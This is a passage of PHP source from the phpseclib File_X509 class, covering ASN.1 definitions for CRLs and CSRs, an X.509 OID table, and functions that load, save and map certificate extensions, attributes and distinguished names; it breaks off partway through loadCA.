        );

        $TBSCertList = array(
            'type'     => FILE_ASN1_TYPE_SEQUENCE,
            'children' => array(
                'version'             => array(
                                             'optional' => true,
                                             'default'  => 'v1'
                                         ) + $Version,
                'signature'           => $AlgorithmIdentifier,
                'issuer'              => $this->Name,
                'thisUpdate'          => $Time,
                'nextUpdate'          => array(
                                             'optional' => true
                                         ) + $Time,
                'revokedCertificates' => array(
                                             'type'     => FILE_ASN1_TYPE_SEQUENCE,
                                             'optional' => true,
                                             'min'      => 0,
                                             'max'      => -1,
                                             'children' => $RevokedCertificate
                                         ),
                'crlExtensions'       => array(
                                             'constant' => 0,
                                             'optional' => true,
                                             'explicit' => true
                                         ) + $this->Extensions
            )
        );

        $this->CertificateList = array(
            'type'     => FILE_ASN1_TYPE_SEQUENCE,
            'children' => array(
                'tbsCertList'        => $TBSCertList,
                'signatureAlgorithm' => $AlgorithmIdentifier,
                'signature'          => array('type' => FILE_ASN1_TYPE_BIT_STRING)
            )
        );

        $this->CRLNumber = array('type' => FILE_ASN1_TYPE_INTEGER);

        $this->CRLReason = array('type' => FILE_ASN1_TYPE_ENUMERATED,
           'mapping' => array(
                            'unspecified',
                            'keyCompromise',
                            'cACompromise',
                            'affiliationChanged',
                            'superseded',
                            'cessationOfOperation',
                            'certificateHold',
                            // Value 7 is not used.
                            8 => 'removeFromCRL',
                            'privilegeWithdrawn',
                            'aACompromise'
            )
        );

        $this->IssuingDistributionPoint = array('type' => FILE_ASN1_TYPE_SEQUENCE,
            'children' => array(
                'distributionPoint'          => array(
                                                    'constant' => 0,
                                                    'optional' => true,
                                                    'explicit' => true
                                                ) + $DistributionPointName,
                'onlyContainsUserCerts'      => array(
                                                    'type'     => FILE_ASN1_TYPE_BOOLEAN,
                                                    'constant' => 1,
                                                    'optional' => true,
                                                    'default'  => false,
                                                    'implicit' => true
                                                ),
                'onlyContainsCACerts'        => array(
                                                    'type'     => FILE_ASN1_TYPE_BOOLEAN,
                                                    'constant' => 2,
                                                    'optional' => true,
                                                    'default'  => false,
                                                    'implicit' => true
                                                ),
                'onlySomeReasons'           => array(
                                                    'constant' => 3,
                                                    'optional' => true,
                                                    'implicit' => true
                                                ) + $ReasonFlags,
                'indirectCRL'               => array(
                                                    'type'     => FILE_ASN1_TYPE_BOOLEAN,
                                                    'constant' => 4,
                                                    'optional' => true,
                                                    'default'  => false,
                                                    'implicit' => true
                                                ),
                'onlyContainsAttributeCerts' => array(
                                                    'type'     => FILE_ASN1_TYPE_BOOLEAN,
                                                    'constant' => 5,
                                                    'optional' => true,
                                                    'default'  => false,
                                                    'implicit' => true
                                                )
                          )
        );

        $this->InvalidityDate = array('type' => FILE_ASN1_TYPE_GENERALIZED_TIME);

        $this->CertificateIssuer = $GeneralNames;

        $this->HoldInstructionCode = array('type' => FILE_ASN1_TYPE_OBJECT_IDENTIFIER);

        $PublicKeyAndChallenge = array(
            'type'     => FILE_ASN1_TYPE_SEQUENCE,
            'children' => array(
                'spki'      => $SubjectPublicKeyInfo,
                'challenge' => array('type' => FILE_ASN1_TYPE_IA5_STRING)
            )
        );

        $this->SignedPublicKeyAndChallenge = array(
            'type'     => FILE_ASN1_TYPE_SEQUENCE,
            'children' => array(
                'publicKeyAndChallenge' => $PublicKeyAndChallenge,
                'signatureAlgorithm'    => $AlgorithmIdentifier,
                'signature'             => array('type' => FILE_ASN1_TYPE_BIT_STRING)
            )
        );

        $this->PostalAddress = array(
            'type'     => FILE_ASN1_TYPE_SEQUENCE,
            'optional' => true,
            'min'      => 1,
            'max'      => -1,
            'children' => $this->DirectoryString
        );

        // OIDs from RFC5280 and those RFCs mentioned in RFC5280#section-4.1.1.2
        $this->oids = array(
            '1.3.6.1.5.5.7' => 'id-pkix',
            '1.3.6.1.5.5.7.1' => 'id-pe',
            '1.3.6.1.5.5.7.2' => 'id-qt',
            '1.3.6.1.5.5.7.3' => 'id-kp',
            '1.3.6.1.5.5.7.48' => 'id-ad',
            '1.3.6.1.5.5.7.2.1' => 'id-qt-cps',
            '1.3.6.1.5.5.7.2.2' => 'id-qt-unotice',
            '1.3.6.1.5.5.7.48.1' =>'id-ad-ocsp',
            '1.3.6.1.5.5.7.48.2' => 'id-ad-caIssuers',
            '1.3.6.1.5.5.7.48.3' => 'id-ad-timeStamping',
            '1.3.6.1.5.5.7.48.5' => 'id-ad-caRepository',
            '2.5.4' => 'id-at',
            '2.5.4.41' => 'id-at-name',
            '2.5.4.4' => 'id-at-surname',
            '2.5.4.42' => 'id-at-givenName',
            '2.5.4.43' => 'id-at-initials',
            '2.5.4.44' => 'id-at-generationQualifier',
            '2.5.4.3' => 'id-at-commonName',
            '2.5.4.7' => 'id-at-localityName',
            '2.5.4.8' => 'id-at-stateOrProvinceName',
            '2.5.4.10' => 'id-at-organizationName',
            '2.5.4.11' => 'id-at-organizationalUnitName',
            '2.5.4.12' => 'id-at-title',
            '2.5.4.13' => 'id-at-description',
            '2.5.4.46' => 'id-at-dnQualifier',
            '2.5.4.6' => 'id-at-countryName',
            '2.5.4.5' => 'id-at-serialNumber',
            '2.5.4.65' => 'id-at-pseudonym',
            '2.5.4.17' => 'id-at-postalCode',
            '2.5.4.9' => 'id-at-streetAddress',
            '2.5.4.45' => 'id-at-uniqueIdentifier',
            '2.5.4.72' => 'id-at-role',
            '2.5.4.16' => 'id-at-postalAddress',

            '0.9.2342.19200300.100.1.25' => 'id-domainComponent',
            '1.2.840.113549.1.9' => 'pkcs-9',
            '1.2.840.113549.1.9.1' => 'pkcs-9-at-emailAddress',
            '2.5.29' => 'id-ce',
            '2.5.29.35' => 'id-ce-authorityKeyIdentifier',
            '2.5.29.14' => 'id-ce-subjectKeyIdentifier',
            '2.5.29.15' => 'id-ce-keyUsage',
            '2.5.29.16' => 'id-ce-privateKeyUsagePeriod',
            '2.5.29.32' => 'id-ce-certificatePolicies',
            '2.5.29.32.0' => 'anyPolicy',

            '2.5.29.33' => 'id-ce-policyMappings',
            '2.5.29.17' => 'id-ce-subjectAltName',
            '2.5.29.18' => 'id-ce-issuerAltName',
            '2.5.29.9' => 'id-ce-subjectDirectoryAttributes',
            '2.5.29.19' => 'id-ce-basicConstraints',
            '2.5.29.30' => 'id-ce-nameConstraints',
            '2.5.29.36' => 'id-ce-policyConstraints',
            '2.5.29.31' => 'id-ce-cRLDistributionPoints',
            '2.5.29.37' => 'id-ce-extKeyUsage',
            '2.5.29.37.0' => 'anyExtendedKeyUsage',
            '1.3.6.1.5.5.7.3.1' => 'id-kp-serverAuth',
            '1.3.6.1.5.5.7.3.2' => 'id-kp-clientAuth',
            '1.3.6.1.5.5.7.3.3' => 'id-kp-codeSigning',
            '1.3.6.1.5.5.7.3.4' => 'id-kp-emailProtection',
            '1.3.6.1.5.5.7.3.8' => 'id-kp-timeStamping',
            '1.3.6.1.5.5.7.3.9' => 'id-kp-OCSPSigning',
            '2.5.29.54' => 'id-ce-inhibitAnyPolicy',
            '2.5.29.46' => 'id-ce-freshestCRL',
            '1.3.6.1.5.5.7.1.1' => 'id-pe-authorityInfoAccess',
            '1.3.6.1.5.5.7.1.11' => 'id-pe-subjectInfoAccess',
            '2.5.29.20' => 'id-ce-cRLNumber',
            '2.5.29.28' => 'id-ce-issuingDistributionPoint',
            '2.5.29.27' => 'id-ce-deltaCRLIndicator',
            '2.5.29.21' => 'id-ce-cRLReasons',
            '2.5.29.29' => 'id-ce-certificateIssuer',
            '2.5.29.23' => 'id-ce-holdInstructionCode',
            '1.2.840.10040.2' => 'holdInstruction',
            '1.2.840.10040.2.1' => 'id-holdinstruction-none',
            '1.2.840.10040.2.2' => 'id-holdinstruction-callissuer',
            '1.2.840.10040.2.3' => 'id-holdinstruction-reject',
            '2.5.29.24' => 'id-ce-invalidityDate',

            '1.2.840.113549.2.2' => 'md2',
            '1.2.840.113549.2.5' => 'md5',
            '1.3.14.3.2.26' => 'id-sha1',
            '1.2.840.10040.4.1' => 'id-dsa',
            '1.2.840.10040.4.3' => 'id-dsa-with-sha1',
            '1.2.840.113549.1.1' => 'pkcs-1',
            '1.2.840.113549.1.1.1' => 'rsaEncryption',
            '1.2.840.113549.1.1.2' => 'md2WithRSAEncryption',
            '1.2.840.113549.1.1.4' => 'md5WithRSAEncryption',
            '1.2.840.113549.1.1.5' => 'sha1WithRSAEncryption',
            '1.2.840.10046.2.1' => 'dhpublicnumber',
            '2.16.840.1.101.2.1.1.22' => 'id-keyExchangeAlgorithm',
            '1.2.840.10045' => 'ansi-X9-62',
            '1.2.840.10045.4' => 'id-ecSigType',
            '1.2.840.10045.4.1' => 'ecdsa-with-SHA1',
            '1.2.840.10045.1' => 'id-fieldType',
            '1.2.840.10045.1.1' => 'prime-field',
            '1.2.840.10045.1.2' => 'characteristic-two-field',
            '1.2.840.10045.1.2.3' => 'id-characteristic-two-basis',
            '1.2.840.10045.1.2.3.1' => 'gnBasis',
            '1.2.840.10045.1.2.3.2' => 'tpBasis',
            '1.2.840.10045.1.2.3.3' => 'ppBasis',
            '1.2.840.10045.2' => 'id-publicKeyType',
            '1.2.840.10045.2.1' => 'id-ecPublicKey',
            '1.2.840.10045.3' => 'ellipticCurve',
            '1.2.840.10045.3.0' => 'c-TwoCurve',
            '1.2.840.10045.3.0.1' => 'c2pnb163v1',
            '1.2.840.10045.3.0.2' => 'c2pnb163v2',
            '1.2.840.10045.3.0.3' => 'c2pnb163v3',
            '1.2.840.10045.3.0.4' => 'c2pnb176w1',
            '1.2.840.10045.3.0.5' => 'c2pnb191v1',
            '1.2.840.10045.3.0.6' => 'c2pnb191v2',
            '1.2.840.10045.3.0.7' => 'c2pnb191v3',
            '1.2.840.10045.3.0.8' => 'c2pnb191v4',
            '1.2.840.10045.3.0.9' => 'c2pnb191v5',
            '1.2.840.10045.3.0.10' => 'c2pnb208w1',
            '1.2.840.10045.3.0.11' => 'c2pnb239v1',
            '1.2.840.10045.3.0.12' => 'c2pnb239v2',
            '1.2.840.10045.3.0.13' => 'c2pnb239v3',
            '1.2.840.10045.3.0.14' => 'c2pnb239v4',
            '1.2.840.10045.3.0.15' => 'c2pnb239v5',
            '1.2.840.10045.3.0.16' => 'c2pnb272w1',
            '1.2.840.10045.3.0.17' => 'c2pnb304w1',
            '1.2.840.10045.3.0.18' => 'c2pnb359v1',
            '1.2.840.10045.3.0.19' => 'c2pnb368w1',
            '1.2.840.10045.3.0.20' => 'c2pnb431r1',
            '1.2.840.10045.3.1' => 'primeCurve',
            '1.2.840.10045.3.1.1' => 'prime192v1',
            '1.2.840.10045.3.1.2' => 'prime192v2',
            '1.2.840.10045.3.1.3' => 'prime192v3',
            '1.2.840.10045.3.1.4' => 'prime239v1',
            '1.2.840.10045.3.1.5' => 'prime239v2',
            '1.2.840.10045.3.1.6' => 'prime239v3',
            '1.2.840.10045.3.1.7' => 'prime256v1',
            '1.2.840.113549.1.1.7' => 'id-RSAES-OAEP',
            '1.2.840.113549.1.1.9' => 'id-pSpecified',
            '1.2.840.113549.1.1.10' => 'id-RSASSA-PSS',
            '1.2.840.113549.1.1.8' => 'id-mgf1',
            '1.2.840.113549.1.1.14' => 'sha224WithRSAEncryption',
            '1.2.840.113549.1.1.11' => 'sha256WithRSAEncryption',
            '1.2.840.113549.1.1.12' => 'sha384WithRSAEncryption',
            '1.2.840.113549.1.1.13' => 'sha512WithRSAEncryption',
            '2.16.840.1.101.3.4.2.4' => 'id-sha224',
            '2.16.840.1.101.3.4.2.1' => 'id-sha256',
            '2.16.840.1.101.3.4.2.2' => 'id-sha384',
            '2.16.840.1.101.3.4.2.3' => 'id-sha512',
            '1.2.643.2.2.4' => 'id-GostR3411-94-with-GostR3410-94',
            '1.2.643.2.2.3' => 'id-GostR3411-94-with-GostR3410-2001',
            '1.2.643.2.2.20' => 'id-GostR3410-2001',
            '1.2.643.2.2.19' => 'id-GostR3410-94',
            // Netscape Object Identifiers from "Netscape Certificate Extensions"
            '2.16.840.1.113730' => 'netscape',
            '2.16.840.1.113730.1' => 'netscape-cert-extension',
            '2.16.840.1.113730.1.1' => 'netscape-cert-type',
            '2.16.840.1.113730.1.13' => 'netscape-comment',
            '2.16.840.1.113730.1.8' => 'netscape-ca-policy-url',
            // the following are X.509 extensions not supported by phpseclib
            '1.3.6.1.5.5.7.1.12' => 'id-pe-logotype',
            '1.2.840.113533.7.65.0' => 'entrustVersInfo',
            '2.16.840.1.113733.1.6.9' => 'verisignPrivate',
            // for Certificate Signing Requests
            // see http://tools.ietf.org/html/rfc2985
            '1.2.840.113549.1.9.2' => 'pkcs-9-at-unstructuredName', // PKCS #9 unstructured name
            '1.2.840.113549.1.9.7' => 'pkcs-9-at-challengePassword', // Challenge password for certificate revocations
            '1.2.840.113549.1.9.14' => 'pkcs-9-at-extensionRequest' // Certificate extension request
        );
    }

    /**
     * PHP4 compatible Default Constructor.
     *
     * @see self::__construct()
     * @access public
     */
    function File_X509()
    {
        $this->__construct();
    }

    /**
     * Load X.509 certificate
     *
     * Returns an associative array describing the X.509 cert or a false if the cert failed to load
     *
     * @param string $cert
     * @param int $mode
     * @access public
     * @return mixed
     */
    function loadX509($cert, $mode = FILE_X509_FORMAT_AUTO_DETECT)
    {
        if (is_array($cert) && isset($cert['tbsCertificate'])) {
            unset($this->currentCert);
            unset($this->currentKeyIdentifier);
            $this->dn = $cert['tbsCertificate']['subject'];
            if (!isset($this->dn)) {
                return false;
            }
            $this->currentCert = $cert;

            $currentKeyIdentifier = $this->getExtension('id-ce-subjectKeyIdentifier');
            $this->currentKeyIdentifier = is_string($currentKeyIdentifier) ? $currentKeyIdentifier : null;

            unset($this->signatureSubject);

            return $cert;
        }

        $asn1 = new File_ASN1();

        if ($mode != FILE_X509_FORMAT_DER) {
            $newcert = $this->_extractBER($cert);
            if ($mode == FILE_X509_FORMAT_PEM && $cert == $newcert) {
                return false;
            }
            $cert = $newcert;
        }

        if ($cert === false) {
            $this->currentCert = false;
            return false;
        }

        $asn1->loadOIDs($this->oids);
        $decoded = $asn1->decodeBER($cert);

        if (!empty($decoded)) {
            $x509 = $asn1->asn1map($decoded[0], $this->Certificate);
        }
        if (!isset($x509) || $x509 === false) {
            $this->currentCert = false;
            return false;
        }

        $this->signatureSubject = substr($cert, $decoded[0]['content'][0]['start'], $decoded[0]['content'][0]['length']);

        if ($this->_isSubArrayValid($x509, 'tbsCertificate/extensions')) {
            $this->_mapInExtensions($x509, 'tbsCertificate/extensions', $asn1);
        }
        $this->_mapInDNs($x509, 'tbsCertificate/issuer/rdnSequence', $asn1);
        $this->_mapInDNs($x509, 'tbsCertificate/subject/rdnSequence', $asn1);

        $key = &$x509['tbsCertificate']['subjectPublicKeyInfo']['subjectPublicKey'];
        $key = $this->_reformatKey($x509['tbsCertificate']['subjectPublicKeyInfo']['algorithm']['algorithm'], $key);

        $this->currentCert = $x509;
        $this->dn = $x509['tbsCertificate']['subject'];

        $currentKeyIdentifier = $this->getExtension('id-ce-subjectKeyIdentifier');
        $this->currentKeyIdentifier = is_string($currentKeyIdentifier) ? $currentKeyIdentifier : null;

        return $x509;
    }

    /**
     * Save X.509 certificate
     *
     * @param array $cert
     * @param int $format optional
     * @access public
     * @return string
     */
    function saveX509($cert, $format = FILE_X509_FORMAT_PEM)
    {
        if (!is_array($cert) || !isset($cert['tbsCertificate'])) {
            return false;
        }

        switch (true) {
            // "case !$a: case !$b: break; default: whatever();" is the same thing as "if ($a && $b) whatever()"
            case !($algorithm = $this->_subArray($cert, 'tbsCertificate/subjectPublicKeyInfo/algorithm/algorithm')):
            case is_object($cert['tbsCertificate']['subjectPublicKeyInfo']['subjectPublicKey']):
                break;
            default:
                switch ($algorithm) {
                    case 'rsaEncryption':
                        $cert['tbsCertificate']['subjectPublicKeyInfo']['subjectPublicKey']
                            = base64_encode("\0" . base64_decode(preg_replace('#-.+-|[\r\n]#', '', $cert['tbsCertificate']['subjectPublicKeyInfo']['subjectPublicKey'])));
                        /* "[For RSA keys] the parameters field MUST have ASN.1 type NULL for this algorithm identifier."
                           -- https://tools.ietf.org/html/rfc3279#section-2.3.1

                           given that and the fact that RSA keys appear ot be the only key type for which the parameters field can be blank,
                           it seems like perhaps the ASN.1 description ought not say the parameters field is OPTIONAL, but whatever.
                         */
                        $cert['tbsCertificate']['subjectPublicKeyInfo']['algorithm']['parameters'] = null;
                        // https://tools.ietf.org/html/rfc3279#section-2.2.1
                        $cert['signatureAlgorithm']['parameters'] = null;
                        $cert['tbsCertificate']['signature']['parameters'] = null;
                }
        }

        $asn1 = new File_ASN1();
        $asn1->loadOIDs($this->oids);

        $filters = array();
        $type_utf8_string = array('type' => FILE_ASN1_TYPE_UTF8_STRING);
        $filters['tbsCertificate']['signature']['parameters'] = $type_utf8_string;
        $filters['tbsCertificate']['signature']['issuer']['rdnSequence']['value'] = $type_utf8_string;
        $filters['tbsCertificate']['issuer']['rdnSequence']['value'] = $type_utf8_string;
        $filters['tbsCertificate']['subject']['rdnSequence']['value'] = $type_utf8_string;
        $filters['tbsCertificate']['subjectPublicKeyInfo']['algorithm']['parameters'] = $type_utf8_string;
        $filters['signatureAlgorithm']['parameters'] = $type_utf8_string;
        $filters['authorityCertIssuer']['directoryName']['rdnSequence']['value'] = $type_utf8_string;
        //$filters['policyQualifiers']['qualifier'] = $type_utf8_string;
        $filters['distributionPoint']['fullName']['directoryName']['rdnSequence']['value'] = $type_utf8_string;
        $filters['directoryName']['rdnSequence']['value'] = $type_utf8_string;

        /* in the case of policyQualifiers/qualifier, the type has to be FILE_ASN1_TYPE_IA5_STRING.
           FILE_ASN1_TYPE_PRINTABLE_STRING will cause OpenSSL's X.509 parser to spit out random
           characters.
         */
        $filters['policyQualifiers']['qualifier']
            = array('type' => FILE_ASN1_TYPE_IA5_STRING);

        $asn1->loadFilters($filters);

        $this->_mapOutExtensions($cert, 'tbsCertificate/extensions', $asn1);
        $this->_mapOutDNs($cert, 'tbsCertificate/issuer/rdnSequence', $asn1);
        $this->_mapOutDNs($cert, 'tbsCertificate/subject/rdnSequence', $asn1);

        $cert = $asn1->encodeDER($cert, $this->Certificate);

        switch ($format) {
            case FILE_X509_FORMAT_DER:
                return $cert;
            // case FILE_X509_FORMAT_PEM:
            default:
                return "-----BEGIN CERTIFICATE-----\r\n" . chunk_split(base64_encode($cert), 64) . '-----END CERTIFICATE-----';
        }
    }

    /**
     * Map extension values from octet string to extension-specific internal
     *   format.
     *
     * @param array ref $root
     * @param string $path
     * @param object $asn1
     * @access private
     */
    function _mapInExtensions(&$root, $path, $asn1)
    {
        $extensions = &$this->_subArrayUnchecked($root, $path);

        if ($extensions) {
            for ($i = 0; $i < count($extensions); $i++) {
                $id = $extensions[$i]['extnId'];
                $value = &$extensions[$i]['extnValue'];
                $value = base64_decode($value);
                $decoded = $asn1->decodeBER($value);
                /* [extnValue] contains the DER encoding of an ASN.1 value
                   corresponding to the extension type identified by extnID */
                $map = $this->_getMapping($id);
                if (!is_bool($map)) {
                    $mapped = $asn1->asn1map($decoded[0], $map, array('iPAddress' => array($this, '_decodeIP')));
                    $value = $mapped === false ? $decoded[0] : $mapped;

                    if ($id == 'id-ce-certificatePolicies') {
                        for ($j = 0; $j < count($value); $j++) {
                            if (!isset($value[$j]['policyQualifiers'])) {
                                continue;
                            }
                            for ($k = 0; $k < count($value[$j]['policyQualifiers']); $k++) {
                                $subid = $value[$j]['policyQualifiers'][$k]['policyQualifierId'];
                                $map = $this->_getMapping($subid);
                                $subvalue = &$value[$j]['policyQualifiers'][$k]['qualifier'];
                                if ($map !== false) {
                                    $decoded = $asn1->decodeBER($subvalue);
                                    $mapped = $asn1->asn1map($decoded[0], $map);
                                    $subvalue = $mapped === false ? $decoded[0] : $mapped;
                                }
                            }
                        }
                    }
                } else {
                    $value = base64_encode($value);
                }
            }
        }
    }

    /**
     * Map extension values from extension-specific internal format to
     *   octet string.
     *
     * @param array ref $root
     * @param string $path
     * @param object $asn1
     * @access private
     */
    function _mapOutExtensions(&$root, $path, $asn1)
    {
        $extensions = &$this->_subArray($root, $path);

        if (is_array($extensions)) {
            $size = count($extensions);
            for ($i = 0; $i < $size; $i++) {
                if (is_object($extensions[$i]) && strtolower(get_class($extensions[$i])) == 'file_asn1_element') {
                    continue;
                }

                $id = $extensions[$i]['extnId'];
                $value = &$extensions[$i]['extnValue'];

                switch ($id) {
                    case 'id-ce-certificatePolicies':
                        for ($j = 0; $j < count($value); $j++) {
                            if (!isset($value[$j]['policyQualifiers'])) {
                                continue;
                            }
                            for ($k = 0; $k < count($value[$j]['policyQualifiers']); $k++) {
                                $subid = $value[$j]['policyQualifiers'][$k]['policyQualifierId'];
                                $map = $this->_getMapping($subid);
                                $subvalue = &$value[$j]['policyQualifiers'][$k]['qualifier'];
                                if ($map !== false) {
                                    // by default File_ASN1 will try to render qualifier as a FILE_ASN1_TYPE_IA5_STRING since it's
                                    // actual type is FILE_ASN1_TYPE_ANY
                                    $subvalue = new File_ASN1_Element($asn1->encodeDER($subvalue, $map));
                                }
                            }
                        }
                        break;
                    case 'id-ce-authorityKeyIdentifier': // use 00 as the serial number instead of an empty string
                        if (isset($value['authorityCertSerialNumber'])) {
                            if ($value['authorityCertSerialNumber']->toBytes() == '') {
                                $temp = chr((FILE_ASN1_CLASS_CONTEXT_SPECIFIC << 6) | 2) . "\1\0";
                                $value['authorityCertSerialNumber'] = new File_ASN1_Element($temp);
                            }
                        }
                }

                /* [extnValue] contains the DER encoding of an ASN.1 value
                   corresponding to the extension type identified by extnID */
                $map = $this->_getMapping($id);
                if (is_bool($map)) {
                    if (!$map) {
                        user_error($id . ' is not a currently supported extension');
                        unset($extensions[$i]);
                    }
                } else {
                    $temp = $asn1->encodeDER($value, $map, array('iPAddress' => array($this, '_encodeIP')));
                    $value = base64_encode($temp);
                }
            }
        }
    }

    /**
     * Map attribute values from ANY type to attribute-specific internal
     *   format.
     *
     * @param array ref $root
     * @param string $path
     * @param object $asn1
     * @access private
     */
    function _mapInAttributes(&$root, $path, $asn1)
    {
        $attributes = &$this->_subArray($root, $path);

        if (is_array($attributes)) {
            for ($i = 0; $i < count($attributes); $i++) {
                $id = $attributes[$i]['type'];
                /* $value contains the DER encoding of an ASN.1 value
                   corresponding to the attribute type identified by type */
                $map = $this->_getMapping($id);
                if (is_array($attributes[$i]['value'])) {
                    $values = &$attributes[$i]['value'];
                    for ($j = 0; $j < count($values); $j++) {
                        $value = $asn1->encodeDER($values[$j], $this->AttributeValue);
                        $decoded = $asn1->decodeBER($value);
                        if (!is_bool($map)) {
                            $mapped = $asn1->asn1map($decoded[0], $map);
                            if ($mapped !== false) {
                                $values[$j] = $mapped;
                            }
                            if ($id == 'pkcs-9-at-extensionRequest' && $this->_isSubArrayValid($values, $j)) {
                                $this->_mapInExtensions($values, $j, $asn1);
                            }
                        } elseif ($map) {
                            $values[$j] = base64_encode($value);
                        }
                    }
                }
            }
        }
    }

    /**
     * Map attribute values from attribute-specific internal format to
     *   ANY type.
     *
     * @param array ref $root
     * @param string $path
     * @param object $asn1
     * @access private
     */
    function _mapOutAttributes(&$root, $path, $asn1)
    {
        $attributes = &$this->_subArray($root, $path);

        if (is_array($attributes)) {
            $size = count($attributes);
            for ($i = 0; $i < $size; $i++) {
                /* [value] contains the DER encoding of an ASN.1 value
                   corresponding to the attribute type identified by type */
                $id = $attributes[$i]['type'];
                $map = $this->_getMapping($id);
                if ($map === false) {
                    user_error($id . ' is not a currently supported attribute', E_USER_NOTICE);
                    unset($attributes[$i]);
                } elseif (is_array($attributes[$i]['value'])) {
                    $values = &$attributes[$i]['value'];
                    for ($j = 0; $j < count($values); $j++) {
                        switch ($id) {
                            case 'pkcs-9-at-extensionRequest':
                                $this->_mapOutExtensions($values, $j, $asn1);
                                break;
                        }

                        if (!is_bool($map)) {
                            $temp = $asn1->encodeDER($values[$j], $map);
                            $decoded = $asn1->decodeBER($temp);
                            $values[$j] = $asn1->asn1map($decoded[0], $this->AttributeValue);
                        }
                    }
                }
            }
        }
    }

    /**
     * Map DN values from ANY type to DN-specific internal
     *   format.
     *
     * @param array ref $root
     * @param string $path
     * @param object $asn1
     * @access private
     */
    function _mapInDNs(&$root, $path, $asn1)
    {
        $dns = &$this->_subArray($root, $path);

        if (is_array($dns)) {
            for ($i = 0; $i < count($dns); $i++) {
                for ($j = 0; $j < count($dns[$i]); $j++) {
                    $type = $dns[$i][$j]['type'];
                    $value = &$dns[$i][$j]['value'];
                    if (is_object($value) && strtolower(get_class($value)) == 'file_asn1_element') {
                        $map = $this->_getMapping($type);
                        if (!is_bool($map)) {
                            $decoded = $asn1->decodeBER($value);
                            $value = $asn1->asn1map($decoded[0], $map);
                        }
                    }
                }
            }
        }
    }

    /**
     * Map DN values from DN-specific internal format to
     *   ANY type.
     *
     * @param array ref $root
     * @param string $path
     * @param object $asn1
     * @access private
     */
    function _mapOutDNs(&$root, $path, $asn1)
    {
        $dns = &$this->_subArray($root, $path);

        if (is_array($dns)) {
            $size = count($dns);
            for ($i = 0; $i < $size; $i++) {
                for ($j = 0; $j < count($dns[$i]); $j++) {
                    $type = $dns[$i][$j]['type'];
                    $value = &$dns[$i][$j]['value'];
                    if (is_object($value) && strtolower(get_class($value)) == 'file_asn1_element') {
                        continue;
                    }

                    $map = $this->_getMapping($type);
                    if (!is_bool($map)) {
                        $value = new File_ASN1_Element($asn1->encodeDER($value, $map));
                    }
                }
            }
        }
    }

    /**
     * Associate an extension ID to an extension mapping
     *
     * @param string $extnId
     * @access private
     * @return mixed
     */
    function _getMapping($extnId)
    {
        if (!is_string($extnId)) { // eg. if it's a File_ASN1_Element object
            return true;
        }

        switch ($extnId) {
            case 'id-ce-keyUsage':
                return $this->KeyUsage;
            case 'id-ce-basicConstraints':
                return $this->BasicConstraints;
            case 'id-ce-subjectKeyIdentifier':
                return $this->KeyIdentifier;
            case 'id-ce-cRLDistributionPoints':
                return $this->CRLDistributionPoints;
            case 'id-ce-authorityKeyIdentifier':
                return $this->AuthorityKeyIdentifier;
            case 'id-ce-certificatePolicies':
                return $this->CertificatePolicies;
            case 'id-ce-extKeyUsage':
                return $this->ExtKeyUsageSyntax;
            case 'id-pe-authorityInfoAccess':
                return $this->AuthorityInfoAccessSyntax;
            case 'id-ce-subjectAltName':
                return $this->SubjectAltName;
            case 'id-ce-subjectDirectoryAttributes':
                return $this->SubjectDirectoryAttributes;
            case 'id-ce-privateKeyUsagePeriod':
                return $this->PrivateKeyUsagePeriod;
            case 'id-ce-issuerAltName':
                return $this->IssuerAltName;
            case 'id-ce-policyMappings':
                return $this->PolicyMappings;
            case 'id-ce-nameConstraints':
                return $this->NameConstraints;

            case 'netscape-cert-type':
                return $this->netscape_cert_type;
            case 'netscape-comment':
                return $this->netscape_comment;
            case 'netscape-ca-policy-url':
                return $this->netscape_ca_policy_url;

            // since id-qt-cps isn't a constructed type it will have already been decoded as a string by the time it gets
            // back around to asn1map() and we don't want it decoded again.
            //case 'id-qt-cps':
            //    return $this->CPSuri;
            case 'id-qt-unotice':
                return $this->UserNotice;

            // the following OIDs are unsupported but we don't want them to give notices when calling saveX509().
            case 'id-pe-logotype': // http://www.ietf.org/rfc/rfc3709.txt
            case 'entrustVersInfo':
            // http://support.microsoft.com/kb/287547
            case '1.3.6.1.4.1.311.20.2': // szOID_ENROLL_CERTTYPE_EXTENSION
            case '1.3.6.1.4.1.311.21.1': // szOID_CERTSRV_CA_VERSION
            // "SET Secure Electronic Transaction Specification"
            // http://www.maithean.com/docs/set_bk3.pdf
            case '2.23.42.7.0': // id-set-hashedRootKey
            // "Certificate Transparency"
            // https://tools.ietf.org/html/rfc6962
            case '1.3.6.1.4.1.11129.2.4.2':
                return true;

            // CSR attributes
            case 'pkcs-9-at-unstructuredName':
                return $this->PKCS9String;
            case 'pkcs-9-at-challengePassword':
                return $this->DirectoryString;
            case 'pkcs-9-at-extensionRequest':
                return $this->Extensions;

            // CRL extensions.
            case 'id-ce-cRLNumber':
                return $this->CRLNumber;
            case 'id-ce-deltaCRLIndicator':
                return $this->CRLNumber;
            case 'id-ce-issuingDistributionPoint':
                return $this->IssuingDistributionPoint;
            case 'id-ce-freshestCRL':
                return $this->CRLDistributionPoints;
            case 'id-ce-cRLReasons':
                return $this->CRLReason;
            case 'id-ce-invalidityDate':
                return $this->InvalidityDate;
            case 'id-ce-certificateIssuer':
                return $this->CertificateIssuer;
            case 'id-ce-holdInstructionCode':
                return $this->HoldInstructionCode;
            case 'id-at-postalAddress':
                return $this->PostalAddress;
        }

        return false;
    }

    /**
     * Load an X.509 certificate as a certificate authority
     *
     * @param string $cert
     * @access public
     * @return bool
     */
    function loadCA($cert)
    {
        $olddn = $this->dn;
        $oldcert = $this->currentCert;
        $oldsigsubj = $this->signatureSubject;
        $oldkeyid = $this->currentKeyIdentifier;

        $cert = $this->loadX509($cert);
        if (!$cert) {
            $this->dn = $olddn;
            $this->currentCert = $oldcert;
            $this->signatureSubject = $oldsigsubj;
            $this->currentKeyIdentifier = $oldkeyid;

            return false;
        }

        /* From RFC5280 "PKIX Certificate and CRL Profile":

           If the keyUsage extension is present, then the subject public key
           MUST NOT be used to verify signatures on certificates or CRLs unless
           the corresponding keyCertSign or cRLSign bit is set. */
        //$keyUsage = $this->getExtension('id-ce-keyUsage');
        //if ($keyUsage && !in_array('keyCertSign', $keyUsage)) {
        //    return false;
        //}

        /* From RFC5280 "PKIX Certificate and CRL Profile":

           The cA boolean indicates whether the certified public key may be used
           to verify certificate signatures.  If the cA boolean is not asserted,
           then the keyCertSign bit in the key usage extension MUST NOT be
           asserted.  If the basic constraints extension is not present in a
           version 3 certificate, or the extension is present but the cA boolean
           is not asserted, then the certified public key MUST NOT be used to
           verify certificate signatures. */
        //$basicConstraints = $this->getExtension('id-ce-basicConstraints');
